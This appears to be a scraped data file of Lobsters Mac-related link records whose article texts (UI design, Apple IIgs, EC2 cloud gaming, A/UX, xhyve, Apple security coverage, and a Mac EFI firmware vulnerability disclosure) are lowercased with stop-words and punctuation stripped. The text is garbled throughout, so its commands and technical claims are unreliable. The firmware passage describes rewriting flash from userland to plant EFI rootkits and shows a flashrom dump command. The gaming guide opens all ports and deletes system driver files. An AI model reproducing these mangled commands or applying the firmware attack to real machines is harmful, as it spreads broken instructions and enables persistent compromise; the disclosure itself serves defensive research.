usually divide working time among several application benefit every software developer user learning use new application build prior experience element application guideline helped developer make mac apps looked felt like mac appsdrawbacks pure unadulterated consistency impossible g n critique vaguely saying hard apply conflicting thing consistent designer experience creating software tell certainly tradeoff involved achieving sufficient consistency plenty heuristic user time learn app going spend day earn living mean deviate norm one couple dozen apps use every day carefula pen look like shoe nevrsleep deviantart g n trot silly example pen two kind pen look different still pen tell apart well level consistency software need aim make pen look like shoe credit g n example antimac diversityunfortunately g n articulate clear alternative consistency thought experiment say rich finegrained representation object real world allows pen book wide variety appearance still easily recognizable go representation object computer interface become richer finegrained need complete consistency drop without detail hard know antimac design principle diversity meant dictate wild west ui postmac consistencythis conclusion selfevident especially postmac environment people benefit mac design principle consistency would diversity impedes learning knowledge transfer app app diversity fine married visual interactive unity ensuring thing look feel work mostly consistency still valuable guiding principle preclude creativity need deliberately break itnetworks like twitter facebook reddit forth contributed generation adoption standard sharing content authorizing identity online forth uis product depend heavily fitting model people already understand deviation confusing costly people jet next consistent easierlearned appwysiwyg see get antimac principle represent meaning postmac principle represent meaningwysiwyg pronounced whizzywig effectively state see screen faithful representation exactly see print human interface guideline say secret user abstract command promise future result directive primarily parity onscreen printed display intimately connected direct manipulation seeandpoint design principle wysiwyg manipulate wy directly swyg corrective frustrating experience contemporary day like do computer running wordperfect enter mode tell wordperfect make word bold see bold screen later printed document word abstract command promising future resultgood old wordperfect wy definitely wygbenefits well see get surprisesdrawbacks none really take issue faithfulprintrepresentation goal g n interpret design principle limiting thing screen anything appears window go metaphor like trash course object computer screen something appears word word link might even word contains whole document word someone name might kind representation person rich semantics lost see screen limited literally representing one state one slice deeper underlying objectantimac represent meaningg n propose alternative wysiwyg actually subsumes antimac design principle suggests semanticallyrich object atomic basis interaction word thing screen appear looking miniature business card representing contacting address book picture business card access underlying richer data probably person company able use business card thing might want underlying person company like address email connect two people different company together whatever object underlying given onscreen representation could drawn interacted kind way wysiwyg still possible one appropriate representation word document example view look like printed viewrené magrittepostmac represent meaningthis become dominant design principle even though sometimes bear make happen million one way encode rich semantics given thing hard settle best way much meaning pin mapin postmac environment simulacrum almost everything screen partial virtual representation deeper meaningful thing home location pin google map metaphor picture pin one contextsensitive instance richer object meaningful google mapsinternal notion place live tap reveal play substantial role interacting google map default app show long take drive home place looked similarly place see friend name facebook bet letter name little textual representation click otherwise interact within interface predicated simulacrum real world atomic bit ui successful represent meaning prescriptionmanagement app valuable prescription object ui somehow virtual version prescription ditto item amazon shopping cart list go onbonus build software principle easily design progressive disclosure reveal little meaning time needed
647,Lobsters,mac,Apple macOS,Announcing Apple IIgs System 6.0.2,http://www.callapple.org/software/announcing-apple-iigs-system-6-0-2/,announcing apple iigs system,new apple iigs system finder see also finder help driver file system translator fsts tool next downloads http wwwcallappleorggsosiigs system diskszip http wwwcallappleorggsosiigs system po diskszip author,new apple iigs system year month day hour since system released summary visible change many bug fixed many feature added immediately enable developer create better future product sure also read shortcut file disk information finder see also finder help list fsts includes rdos nameyou navigate folder hierarchy commandup arrow driversthe ethertalk driver included driver unreleased ethernet appletalk card file system translator fsts hfsfst bug removed hf disk safe bug pascalfst removedthe corrected toolsthe animation tool included allows fast animation apple iigsthe textedit bug style used fixedthe font manager bug squashedsome bug window manager removedquickergraph accelerates drawing routine included program unfinished system may become unstable install next proofofconcept update updating system software done bug system let correct update month disk image http wwwcallappleorggsosiigs system diskszip po disk image http wwwcallappleorggsosiigs system po diskszip please follow like u updated june authorapple chairman board club president bill worked founder val j golding apple began archiving material distributed sold apple project led group remained apple bill involved financial industry tokyo major office infrastructure project name march retired write book spend time pursuing personal interest president user group bill charge distribution callapple magazine well organization web site bill currently resides tokyo japan shelton wa splitting time place
649,Lobsters,mac,Apple macOS,How Containers Can Help Non-Developers in Your Business,http://deis.com/blog/2015/how-containers-can-help-non-developers-in-your-business,container help nondevelopers business,common us azure kubernetes service ak,common us azure kubernetes service ak migrate existing application cloud build complex application us machine learning take advantage agility offered microservices architecture
650,Lobsters,mac,Apple macOS,"Revised and much faster, run your own high-end cloud gaming service on EC2!",http://lg.io/2015/07/05/revised-and-much-faster-run-your-own-highend-cloud-gaming-service-on-ec2.html,revised much faster run highend cloud gaming service,playing witcher gpuintensive game fanless macbook past closest amazon datacenter tldr made ami use need go lengthy stepbystep note become le badass use ami instead see instruction cost creating ami right config get window password microsoft remote desktop geforce gtx titan x driver package razer surround select install component server config client config upsh downsh tunnelblick zerotier hamachi install steam gaming time optimization net xinputxaudio library gamingupsh gamingdownsh matt marino dropbox performance gauging steam inhome streaming problem screen locked see part game view extremely choppy really glitchy computer see streaming error hang using premade ami first step step tunnelblick gaming time crisg martinmroz,video playing witcher gpuintensive game fanless macbook written using gaming rig past spending time getting sort feedback many people rewriting article except latest greatest optimization really make thing better using thing like nvfbc graphic card encoding using builtin ssd better hard drive performance plus getting rid thing like vnc also made openvpn instruction easier follow perfect solution fanatic love play aaa game stuck one new fanless macbooks similarly slow machine pretty awesome alternative building new gaming pc make sure good internet connection ideally plus ping closest amazon datacenter article assume mac client though work linux window minor change client tool tldr made ami use need go lengthy stepbystep note become le badass use ami instead see instruction cost believe actually expensive play game way although could potentially save money streaming game cost saving really primary purpose craziness course spot instance streaming eb storage o drive looking play game way bad around hour gaming cost gaming pc note price vary different datacenters creating ami right config aws create new instance use default everywhere except mentioned base image microsoft window server base since window still best game use instance get nvidia grid graphic card though larger instance exist region unsuccessful taking advantage multiple vgpus w sli plus four time cost use spot instance significantly cheaper fraction regular cost regular instance note cost vary depending region usually bid penny storage step leave everything default provision eb drive o live ssdbacked instancestore super fast game go instancestore available z drive security group recommend creating one rule one allows tcp one allows udp one allows icmp source anywhere yes maximum security vpns setting convenient finally key pair create new one since need one window retrieve administrator password later machine spun get window password using private key connect via microsoft remote desktop add detail also make sure select connect admin session avoid gpu detection trouble note first connection might black screen minute creates user profile go crazy download install version geforce gtx titan x driver package window geforce package contains latest driver grid card get error installing driver say detect geforce card remote desktop admin session reboot asked note latest version driver sometimes cause window able restart grid card optimization steam use offload video encoding gpu need enable though download nvfbcenable run following using command prompt nvfbcenableexe enable noreset reboot order make game actually use video card need completely remove default display driver open device manager disable microsoft basic display adapter b uninstall c run following command prompt run command undividually reboot afterwards takeown f c cacls c g administrator f del c start window audio service per instruction also machine soundcard install razer surround get virtual soundcard get fancy simulation note need createlogin razer id account download openvpn select vista installer installing make sure select select install component installing open command prompt run following cd c program filesopenvpneasyrsa initconfig var cleanall buildca leave answer blank buildkeyserver server leave answer blank except common name server yes sign yes commit buildkey client leave answer blank except common name client yes sign yes commit builddh robocopy key config cacrt servercrt serverkey download server config place c program filesopenvpnconfig directory use microsoft remote desktop file sharing feature download following file c program filesopenvpneasyrsakeys directory cacrt clientcrt clientkey onto client computer combine file along client config upsh downsh used forward multicast client server note need wireshark installed mac pcap support order make multicast reliable updown script edit clientovpn file server ip install tunnelblick mac rename folder file client tblk extension double click tunnelblick install vpn finally start openvpn service server also set start automatically connect client bother openvpn gui stuff phewf difficult though pretty badass getting done note alternatively use zerotier make sure enable ip addressing website w ip range openvpn craziness also alternatively zerotier hamachi create new file c startupbat contains md z steamlibrary idea computer boot fresh ensure z drive initialized properly steam use game storage drive add script via gpeditmsc startup see instruction install steam set following setting make remember usernamepassword autologin every time steam preference create add z steamlibrary downloads steam library folder recommend turn automatic signin friend since server always logged friend turn promo dialog interface bottom enable hardware encoding inhome streaming advanced host option enable hardware encoding mac make sure steam installed change inhome streaming enable hardware decoding similar setting might also applicable one tip recommend setting bandwidth limit specifically automatic good guessing set run following log remote desktop session lock screen game start tscon sessionname dest console suggest creating shortcut desktop gaming time make sure image created ready recommend gamingupsh gamingdownsh script mentioned loadsave state via ami tunnelblick client connect vpn start steam client detect remote machine select game install make sure install z drive installing click stream button server client client streaming deus ex human revolution closer view stats optimization machine lot ram suggest setting pagefile something small like see smaller c drive faster ami creation often time game crash trying start usually missing certain library make sure install net xinputxaudio library medium foundation feature package server manager also force run window update apply everything including optional package suggest attempting write script backup z drive c shutting machine game download quite quickly fresh boot steam c drive eb quite slow make easy startstop gaming instance made gamingupsh gamingdownsh gamingdownsh terminate instance creating ami gamingupsh restore ami need jq installed thanks matt marino instruction running window game steam cloud recommend installing dropbox syncing document directory way lose save game file termination performance gauging two way see streaming performance first display performance information option enabled client steam inhome streaming setting ingame press mac information displayed bottom screen make sure encoder always nvfbc significantly slow thing since encoding video done cpu slower hardware encoding grid gpu see form using cpu encoding go making sure software decoding videotoolbox good see incoming bitrate high make sure nobody else using internet packet loss need extremely low often time mtu problem bring double digit making game unplayable google search fix mtu problem graph right side important color basically mean dark blue amount time generateencode frame past turn game resolution setting light blue amount time transfer frame network crazy one spectacular connection one roommate decides start bittorrent etc try keep one low dark blue line possible much control red amount time decode display video much except keep resolution make sure hardware decoding second detailed way look streaming performance press gaming note likely crash mac client process example output found c program file steamlogsstreaminglogtxt server gamenameid witcher wild hunt timesubmitted resolutionx resolutiony capturedescriptionid desktop nvfbc decoderdescriptionid videotoolbox hardware decoding bandwidthlimit frameratelimit slowgamepercent slowcapturepercent slowconvertpercent slowencodepercent slownetworkpercent slowdecodepercent slowdisplaypercent avgclientbitrate stddevclientbitrate avgserverbitrate stddevserverbitrate avglinkbandwidth avgpingms stddevpingms avgcapturems stddevcapturems avgconvertms stddevconvertms avgencodems stddevencodems avgnetworkms stddevnetworkms avgdecodems stddevdecodems avgdisplayms stddevdisplayms avgframems stddevframems avgfps stddevfps bigpicture keyboardmouseinput gamecontrollerinput steamcontrollerinput see information file steam inhome streaming steam group problem start streaming game steam say screen locked need make sure close remote desktop session tscon sessionname dest console see part game view likely launched window improperly cropped steam make sure game fullscreen mode usually done game option game extremely choppy check packet loss percentage pressing higher especially around likely mtu problem try using zerotier hamachi vpn instead openvpn streaming really glitchy bad compression client steam change bitrate unlimitedautomatic computer see steam client go inhome streaming setting disable enable streaming send udp multicast packet forwarded vpn get server reveal also check vpn connection general start steam mac get streaming error follow instruction fix executable game suddenly hang cmdtab game go back steam host press stream button start game terminate current streaming session restart one us remote process resume game thanks jérémie lumbroso using premade ami let face following stuff long tedious process though actually quite interesting everything work sure want get latest gta pronto made ami everything including optimization aws create new instance use instruction first step except select community ami worry key pair fyi amis useast amidfefeeef follow step except password instance log using microsoft remote desktop asked change administrator password change something window need use mac linux mobile client reset password since bug window remote desktop client install tunnelblick mac download vpn configuration unzip clientovpn file change yourhostnamehere instance iphostname rename folder double click import connect vpn username administrator password set previous step set steam though already installed login account credential configure accordingly good go use logout shortcut desktop log follow standard gaming time section huge thanks helping go crisg martinmroz jeff k aws support daniel unterberger clive blackledge matt marino jérémie lumbroso alexander sandström
651,Lobsters,mac,Apple macOS,Apple and IPv6 - Happy Eyeballs,https://www.ietf.org/mail-archive/web/v6ops/current/msg22455.html,apple happy eyeball,apple happy eyeball,apple happy eyeball hi everyone today apple released first public seed io o x el capitan seed third developer seed released yesterday include improved version happy eyeball based testing make happy eyeball implementation go roughly io yosemite io el capitan beta previous implementation four year ago designed select connection lowest latency matter agree internet changed since report indicate biasing towards beneficial customer mainstream instead exception le broken tunnel carriergrade nats increasing number throughput may even better average updated implementation performs following query dns resolver aaaa dns record cache request sent back back wire aaaa first first reply get aaaa send syn immediately first reply get expecting aaaa start timer timer fire send syn get aaaa window move address selection list ip address either dns cache receiving close together perform address selection algorithm sort algorithm us historical rtt data prefer address lower latency leeway historical rtt two compared address within use pick best one list sorted send syn first address start timer based average variance historical tcp rtt roughly speaking start second address around time send syn retransmission first address first address reply synack win race cancel tcp connection attempt behavior prof successful beta period expect traffic apple product future note however describes current beta detail subject change please test mean love see test result receive feedback would like personally thank jason fesler paul saab help investigating issue testing thanks david schinazi coreos networking engineer
652,Lobsters,mac,Apple macOS,A/UX: The Long View (2010),http://basalgangster.macgui.com/RetroMacComputing/The_Long_View/Entries/2010/9/25_A_UX.html,aux long view,bill warner basalgangster macguicom,â â â apple released first version unixbased operating systemâ complete multiuser unix kernel preemptive multitasking memory protectionâ could run regular unix program program like unix box could also run macintosh programsâ practically existing macintosh program could run kind classic environmentâ could write special kind program lived unix environment unix virtual memory memory protection used macintosh toolbox create user interfaceâ pretty easy programmer recompile regular macintosh program take advantage new environmentâ sound little like o x â yes apple available product february version version â time period lot happening apple elsewhere next introduced unixbased operating system september famous meeting pink blue card used plan future macintosh operating system held apple gave developing homegrown multitasking memory protected operating system called o purchased next acquire working unixbased operating system february give â apple time realize already operating system needed future aux â aux â â â apple develop aux become modern fullfeatured backward compatible operating system future make â time aux released people thought knew forâ apple representative mac user group quick explain purpose aux gain access u government marketâ u government one largest computer purchaser world maybe largestâ year work trying get warring faction unix world get along ieee approved standard set feature available unix computer system goal making interoperable making software portableâ standard called posix important u government wanted able buy computer various source lowest bidder basically sameâ everybody wanted sell computer biggest customer supposedly going posix compliantâ posix really standard unix systemsâ unix vendor thought getting uncle sam adopt posix going windfall bad news microsoft appleâ make nonunix system compliant big job microsoft window nt till â best way make posix compliant computer make run unixâ apple hired unisoft company unix port new hardware port standard unix macintosh apple write macintosh environment could run unixâ looked like government going force hapless employee use unix technically great operating system terrible user interface useroriented set productivity softwareâ unix vendor sense human factor engineering whatsoever class computer user mind lot unix user thought emacs great word processorâ many rest advocated viâ never even seen kind software office worker wanted useâ apple must thought offered huge opportunityâ government worker would jump chance buy macintosh run word processor like microsoft word page layout program like pagemaker graphic program like canvas still call unixâ heard thought certainly true aux would sell zillion macintosh uncle samâ work â anybody else interested â â â silly meâ thought government adopted posix standard government worker would actually use posixcompliant computersâ reality think anybody government ever buy posix compliant computerâ know got itâ think ran do window window etcâ always way around kind government standard stuffâ fill standard form explaining able use nonstandard thingâ aux big hit among unix user especially one used macintosh alreadyâ time two computer desk sun workstation running scientific software needed unix macintosh everything elseâ aux meant could reduce number computer desk â bought itâ think cost academic discount list priceâ lot moneyâ remember time pay anything macintosh osâ came computer upgrade freeâ first time pay macintosh o system think cost sun workstation cost thousand bargain meâ ran aux macintosh iifx several year fact long iifx obsoleteâ delayed switching new computer based powerpc chip started shipping faster computer way â teh sux could run auxâ apple never ever ported aux powerpcâ instead offered file server running totally vanilla intensely uninteresting unix called aix time apple colonized ibm nothing apple made sense aux good unix â â â one surprising thing aux reception unix workstation worldâ got great reviewsâ course motorola processor old favorite unix world past primeâ sun introduced line workstation based sparc processor silicon graphic started switching mips processor timeâ macintosh computer running aux could match high end workstation performanceâ however difference performance huge line computer priced personal computer marketâ macintosh running aux way cheaper sparcstation sun iris workstation sgi software perspective macintosh least good maybe betterâ macintosh fast graphic subsystem standard time unisoft done good job unix portâ unixons expected lot thing lacking apple unix box surprised everything liked thereâ thing printingâ apple time great printer better anybody else apple took first license postscript introduced first postscript laser printer first postscript printer apple laserwriter logo itâ apple still major player laser printer appletalk network dynamic addressing resource discoveryâ hooked printer network looked chooser thereâ like bonjour o xâ contrast printing hassle unixâ solve problem unix adobe created package called enscript could interpret output archaic unix printer software postscript send postscript printerâ â look enscript internet today hit gnu knockoff gnulinux guy cooked could capability without paying itâ apparently linux still need even nowâ aux unix vendor included standardâ aux supported appletalk well unix networking stuff aux machine network meant unix box could finally print postscript printer practically configurationâ year give macintosh iifx running aux desktop kept running closet could print unix box â â â unfortunately longer wicked fast macintosh iifxâ still aux distribution disk quadra handy installed aux remember looked worked likeâ aux good mac â â â three kind aux session console macintosh finderâ reason pick anything finderâ like o x unix system today shell session always available opening terminal window aux came xserver program macx allows run program rootless mean macintosh window way o x program doesâ way many others aux work like macintosh operating system â â aux multiuser system user account log inâ mean administrator root access set accountsâ personal computer user unfamiliar kind thing one thing could expected dread unixâ typical macintosh style made easy providing simple clear instructionsâ â â â logged desktop look like regular system desktop except one thingâ alias desktop home folderâ alias directory user name userâ also icon representing two partition part obligatory aux setupâ one macintosh hf partition called macpartition one unix ufs unix file system partition called â system boot using macpartition partition program called aux startupâ aux startup run launch aux operating system mount partitionâ although aux use hf file system root partition read mount macpartition macintosh volume read write even run program â â â aux finder basically finder system user used seeingâ small difference get used toâ one file permissionsâ user permission read write execute program home directory er mean folder everything else limitsâ permission make change directory indicated upper left window form pencil line allowed make changesâ something like convention used appleshare lot macintosh user already used directory really belong also extra dark line tab topâ folder sharing using regular system sharing interface drawn system home directory system folder stuff normally would although see owner â real macintosh way matterâ never encountered system macintosh program work auxâ know one used worked greatâ â â â unix program time occupied bit memory addressing spaceâ required memory management hardware could remap memory rapidlyâ aux unix version time program code loaded starting bottom addressing spaceâ end code region program obtained global system etext whose address etext give end code memory spaceâ code initialized data ie global static variable initial value coded resides home uninitialized dataâ boundary marked edata address end uninitialized data available endâ heap used dynamic memory allocation using malloc like grows end uninitialized dataâ current high limit heap available using sbrk system callâ stack start high point memory grows course space might sparsely mapped physical memory little space would mapped physical memory one timeâ program would use entire gbyte memory space begin course computer time much memoryâ quadra run aux fine accommodate mbytes physical memoryâ despite every program run large addressing spaceâ switching program entire memory space remappedâ provides memory protection entire addressing space computer occupied programâ way program could accidentally mess another writing memory space using valid addressâ map spaceâ â â â regular macintosh program run macintosh system environment try occupy entire bit memory spaceâ system stack program single memory space resident time unless virtual memory turned onâ even virtual memory running big piece program resident time share addressing space program well low memory globals trap dispatch table system heap toolbox româ macintosh environment aux implemented program called startmacâ map lowest memory space mbyte memory virtual regular macintoshâ entire space necessarily available macintosh operating systemâ depends much memory user allocated macintosh environment memory control panelâ default something like mbytes used system think running space sizeâ memory allocated macintosh environment set memory control panel rest addressing space allocated macintosh environment go unusedâ â â â third interesting kind program macintosh environment mapped first part memory rest used typical fashion unix programâ kind program called aux toolbox programâ one macintosh environment mapped every aux toolbox programâ regular macintosh program also live space aux toolbox program share macintosh world others like macintosh program always doâ aux toolbox program use macintosh environment thing regular program doesâ example need stack macintosh worldâ stack place aux program theirsâ code macintosh environment heapâ two heap unix heap macintosh heap two place keep global variable one unix data area one macintosh worldâ becomes little subtleâ example allocate space using unix malloc function kin space unix heapâ allocate space using macintosh newptr function go macintosh heapâ declare global variable go unix data region quickdraw globals macintosh worldâ â â â use macintosh process manager list macintosh program aux toolbox program thereâ use unix p command list unix program aux toolbox program thereâ terminate program using macintosh process manager terminate unix world visa versaâ â â â advantage may obvious go themâ aux toolbox program real unix virtual memoryâ code data protected unix programsâ macintosh outofmemory condition thing pastâ still fix size macintosh partition hardly use storing dataâ small hold user interface thing like menurecords windowrecords likeâ really big stuff code applicationspecific data stored gbyte mbyte memory space belongs aloneâ program aux toolbox program could fit lot program macintosh environment take much spaceâ still benefit macintosh toolbox practically regular toolbox call work perfectly â â â bad news program still share macintosh environment aux toolbox program regular system macintosh programsâ program run cooperative multitasking way themâ macintosh environment one single unix processâ process run high priority nice guess speed user interfaceâ macintosh environment crash crash regular system program also aux toolbox programsâ finder crash happens effectively logged log back inâ bad full reboot running macintosh interface program killed without saving changesâ thing macintosh operating system really wanted fixedâ worst macintosh program crash happen toolbox callsâ always kill macintosh environment â â aux made version yearsâ pursued seems next step would give aux program access macintosh toolbox without share everybody elseâ would made aux almost exactly thing carbon o xâ maybe aux started life part u government posix maneuver microsoft window nt posix compliant apple leadership see aux best hope next generation macintosh o â even bother port powerpc changed processor obvious existence aux toolbox application aux least apple engineer working project recognized potentialâ apple decision maker point apparently cluelessâ know thinking â â â second related questionâ apple promoted aux macintosh user wave future would taken â response carbon o x pretty positiveâ macintosh user excited transition toâ unixbased operating system benefit still macintosh interfaceâ macintosh programmer first excited cocoa happy port program carbon turned easyâ macintosh user responded way aux version capability â sorta doubt itâ one thing aux could free even cheapâ fully apple productâ fact mostly system v unixâ although originally seen value unix time hadâ licensing unix must cheap apple going pay every copy distributedâ even port macintosh done another company apple time badly entangled ibm dependent ibm permission sell basis operating system â â â also macintosh user excited multiuser operating systemsâ nobody worried security timeâ idea log computer attractiveâ file permission even worseâ know lot window user rejected window nt first stuck window want bother file permissionsâ finally problem performanceâ multitasking operating system sound good say mean computer going bunch thing backgroundâ way accomplish without performance hitâ notice computer fastâ late computer fast computer user sensitive responsiveness user interfaceâ application like video could barely work responsive systemsâ performance loss true multitasking system could make fail system singletasking rarely changed context never wanted way written assembly languageâ really lean fastâ good example avid video editor avid founder bill warner originally worked apollo prominent maker thenpopular high end workstation multitasking multiuser unixlike operating systemâ warner originally implemented firstever non linear video editor expensive apollo systemâ month scheduled launch avid software apolloâ tried implementing macintosh iiâ frame rate important metric program like apollo frame secondâ macintosh went rest say historyâ warner switched avid macintosh apollo workstation build motorola processor one used macintosh time performance still premium original macintosh o flaw could thing modern multitasking operation system could â bg basalgangster macguicom know drive crazy call xwindowsâ badâ called timeâ want call itâ difference
653,Lobsters,mac,Apple macOS,xhyve - Lightweight Virtualization on OS X Based on bhyve,http://www.pagetable.com/?p=831,xhyve lightweight virtualization o x based bhyve,hypervisorframework virtualization hvdos xhyve bhyve running tiny core linux xhyve tiny core linux running ubuntu xhyve ubuntu server skerit ubuntu vnc tutorial next step,hypervisorframework user mode virtualization api introduced mac o x yosemite used toy project like hvdos do emulator fullfeatured enough support full virtualization solution example run linux xhyve lightweight virtualization solution o x capable running linux port freebsd bhyve kvmqemu alternative written peter grehan neel natu super lightweight kb size completely standalone dependency bsdlicensed virtualizer o x require kernel extension bhyve kernel code ported user mode code calling hypervisorframework multicpu support networking support run offtheshelf linux distribution could extended run operating system xhyve may make good solution running docker mac instance running tiny core linux xhyve xhyve repository already contains small linux system testing try xhyve typing line git clone http cd xhyve make xhyverunsh see tiny core linux booting terminal window initializing cgroup subsys cpuset initializing cgroup subsys cpu initializing cgroup subsys cpuacct linux version tc box gcc version gcc smp thu oct utc command line earlyprintkserial acpioff biosprovided physical ram map mem usable mem usable nx execute disable protection active smbios present agp agp bridge found lastpfn maxarchpfn pat enabled cpu old new cpu mtrrs blank virtualized system core distributed absolutely warranty v wwwtinycorelinuxcom tc box shut vm exit mac command line enter sudo halt running ubuntu xhyve also install complete linux distribution xhyve tricky bit xhyve come bios efi booter necessary extract kernel initrd linux image pas xhyve manually first download ubuntu server desktop version support text mode installer directory ubuntu inside xhyve directory l l total rwr r mist staff jun need extract kernel initrd little tricky o x recognize hybrid file system image without little hack dd ifdevzero oftmptmpiso dd tmptmpiso hdiutil attach tmptmpiso cp volumesubuntuserver cp volumesubuntuserver create virtual hard disk image gb example dd ifdevzero ofhddimg create script run xhyve correct argument installer binsh kernel ubuntuvmlinuz initrd ubuntuinitrdgz cmdline earlyprintkserial acpioff mem smp c net virtionet imgcd ahcicd imghdd virtioblk ubuntuhddimg pcidev hostbridge lpc lpcdev l stdio buildxhyve mem smp pcidev lpcdev net imgcd imghdd f kexec kernel initrd cmdline want networking enabled easiest run script root requirement lifted codesign binary sudo xhyverunubuntuinstallsh see ubuntu text mode installer select language choose language used installation process selected language also default language installed system language c english go back tab move space selects enter activates button answer straightforward default usually fine make sure select yes asked install grub boot loader master boot record end installation complete screen select go back execute shell copy installed kernel initrd mac side vm type cd target sbinifconfig tar c boot nc l p mac type replacing ip output ifconfig cd ubuntu nc tar x vm exit shell exit select finish installation run ubuntu installation virtual hard disk create following script fixing kernel initrd version number binsh kernel initrd cmdline earlyprintkserial acpioff ro mem smp c net virtionet imghdd virtioblk ubuntuhddimg pcidev hostbridge lpc lpcdev l stdio buildxhyve mem smp pcidev lpcdev net imgcd imghdd f kexec kernel initrd cmdline run script sudo xhyverunubuntush make linux installation useful may want install ssh server sudo aptget install opensshserver install full ui access using vnc sudo aptget install xubuntudesktop run vnc server geometry conntect pasting finder cmdk connect server dialog vnc ubuntulocal also follow skerit ubuntu vnc tutorial get desktop like next step xhyve basic lightweight lot potential developer welcome contribute list current todos idea part readme file repository
654,Lobsters,mac,Apple macOS,Paw – The ultimate REST client for Mac,https://luckymarmot.com/paw,paw ultimate rest client mac,describe apis learn api description paw,describe apis visually build api request describe parameter textual description typing constraint paw natively support json schema import generate fully compliant swagger raml api blueprint description file learn api description paw
656,Lobsters,mac,Apple macOS,Apple is having its Microsoft moment,http://money.cnn.com/2015/06/05/technology/apple-bugs/index.html?iid=SF_LN,apple microsoft moment,much argument apple computer safer bugfree nasty bug let hacker bury computer virus deep inside mac never find flaw appeared let text message crash iphone problem apple security update irregular infrequent googl found supposed fix weak easily bypassed hacker orcl secrecy offer advice update latest software apple patched serious vulnerability april net market share unwillingness pay potentially disastrous computer bug criminal spy willing pay iphone bug admission guilt hacker broke celebrity icloud account exposed nude photo tim cook said company would beef security measure requiring text message second passcode eventually added crucial feature icloud xeno kovah formal campaign aapl microsoft apple bugreporting system need overhaul msft rapid growth,apple microsoft used device buggy computer researcher want company take security seriously much argument apple computer safer bugfree true accustomed annoying glitch pc past year shown mac ipads iphones far five major flaw affected apple product week encountered nasty bug let hacker bury computer virus deep inside mac never find week earlier flaw appeared let text message crash iphone significant issue neither fixed yet faulty code found every operating system app software program apple outdated strategy fixing remember apple would advertise safer window apple microsoft decade ago problem computer engineer hacker people familiar company practice explained apple five thing wrong approach security apple security update irregular infrequent last year took apple day fix problem folk google googl found apple finally patch hole supposed fix weak easily bypassed hacker oracle orcl quickly moved patch java program susceptible terrible informationstealing malware called flashback apple waited two whole month issue fix even though estimated mac infected nt appear regular patch schedule like microsoft appear patch continuously like google chrome said tod beardsley research manager cybersecurity firm sometimes patch slow arrive sometimes patch difficult develop sure issuing quick fix sometimes backfire sense apple treat bug like product usually little late game plan job right waiting long devastating effect leaving apple customer vulnerable hack theft personal information secrecy apple keep quiet security hole example apple nt admit latest mac bug even real would entice hacker exploit acknowledges text message flaw offer advice fix apple nt explained bug root cause apple work mysterious way reputation tightlipped come confirming existence security issue beardsley said transparency would keep customer alert help large community apple developer suggest fix sense secrecy harmful update latest software still using old version mac operating system apple forsaken example apple patched serious vulnerability april latest version yosemite mean left behind user use operating system maverick mountain lion lion snow leopard according industry figure gathered net market share apple defense customer upgrade latest version free true entirely fair older laptop ca nt handle latest software unwillingness pay apple one major tech company nt reward researcher money finding potentially disastrous computer bug although criminal spy willing pay iphone bug nt made public apple pay nothing zip zilch admission guilt frustrates security folk apple nt tend acknowledge wrong hacker broke celebrity icloud account exposed nude photo last year apple ceo tim cook said company would beef security measure blamed user saying problem really engineering thing security feature would prevented celebrity icloud episode like requiring text message second passcode precisely engineering problem apple credit eventually added crucial feature icloud dealing apple nt easy security researcher xeno kovah said even serious case report critical software flaw carnegie mellon computer emergency readiness team apple still responsive accurate company apple bug fixing problem said bad independent apple developer launched formal campaign wrote letter begging apple improve bugreporting system say little changed apple aapl declined comment story microsoft best apple hacker tell cnnmoney apple bugreporting system need overhaul similar one microsoft went year ago microsoft msft go long painful awakening think back year ago window product used hated notoriously buggy came corporate turnaround microsoft introduced patch tuesday month user would get flood update keep safe microsoft started hosting blue hat invitationonly security conference meet facetoface curious often aggressive researcher apple nt host forum like one microsoft successful strategy improving security bug bounty program implemented microsoft stopped fighting legion hacker turned ragtag army microsoft guardian microsoft worm worm meaningful security change made said katie moussouris microsoft former chief security strategist implemented bug bounty program hopefully apple adapt quickly added pressure apple sudden company victim success moussouris explained apple product popular ever finger keyboard mean code explored inevitably bug found good news apple listening change coming apple aware issue company trying improve communicates researcher according person familiar company plan main challenge dealing rapid growth apple get inundated report possible flaw security team want better job paying closer attention big security issue separating real bug fake one cnnmoney new york first published june pm et
657,Lobsters,mac,Apple macOS,How your Mac firmware security is completely broken,https://reverse.put.as/2015/05/29/the-empire-strikes-back-apple-how-your-mac-firmware-security-is-completely-broken/,mac firmware security completely broken,thunderstrike attack uefi security inspired darth misery speed racer efi thunderbolt u efi suspendresume cycle intel exploiting uefi boot script table vulnerability efi thunderstrike spi flash reader efi efi dark jedi boot script efi efi utils efi flashrom dark jedi dark jedi well suspendresume implementation f cked leave flash protection unlocked suspendresume cycle efi efi thunderbolt flashrom efi thunderstrike flash lockdown nvram efi dark jedi unlocked flashrom efi thunderstrike latest efi efi dark jedi let computer sleep always shutdown defcon thunderstrike sith strike dark jedi suspendresume flashrom directhwkext update appears miscalculated thing appears effective never assume bug shallow mitigatedetect possible efi compromise spi dumper efi smc smc gpu rootkits chromebook physical access required exploit bug sudo pmset sleepnow test bug darwindumper directhwkext flashrom flashrom r biosdump v p internal directhwkext flashrom darwindumper worried bug thunderstrike p efi,rootkits fan latest chaos communication congress ccc brought u two excellent presentation thunderstrike trammell hudson attack uefi security inspired darth misery speed racer rafal wojtczuk corey kallenberg first one related possibility attack efi thunderbolt device second interesting vulnerability regarding u efi boot script table greatest thing second vulnerability allows unlock flash protection modifying boot script executed suspendresume cycle dmytro oleksiuk aka released proof concept code regarding attack intel motherboard interesting blog post exploiting uefi boot script table vulnerability definitely read interest efi mostly unlocking firmware password forgot trammell release proof concept code thunderstrike release awesome tool spi flash reader teensy extremely fast reading firmware flash content take minute great improvement versus buspirate took hour read flash memory month tried get efi world buspirate slow impossible use trial error testing new tool got interest back efi anyway enough bla bla trammell presentation mentioned possiblity mac could also vulnerable dark jedi attack blog post decided give try explore attack attack requires reverse boot script implementation royal pain as efi binary bit annoying reverse even assistance efi utils ida also bug regarding efi binary experiment flashrom finally noticed something big believe first time tried mac indeed true mac even bigger hole dark jedi drum hole dark jedi hard achieve mac extremely easy apple dirty work hell talking well suspendresume implementation f cked leave flash protection unlocked suspendresume cycle ask hell mean mean overwrite content bios userland rootkit efi without trick suspendresume cycle kernel extension flashrom root access wait saying mac efi rootkitted userland without trick thunderbolt trammell presented yes one hell hole let show happens following flashrom output freshly rebooted macbook pro retina running latest efi firmware available firmware released fix thunderstrike flashrom r biosdump v p internal flashrom darwin flashrom free software get source code http wwwflashromorg found chipset intel pci id bioscntl bios lock enable disabled bios write enable enabled root complex register block address gc bios interface lockdown enabled boot bios strap spi top swap enabled spibar hsfs hsfs warning spi configuration lockdown activated reading opcodes done hsfc hsfc frap bmwag bmrag brwa 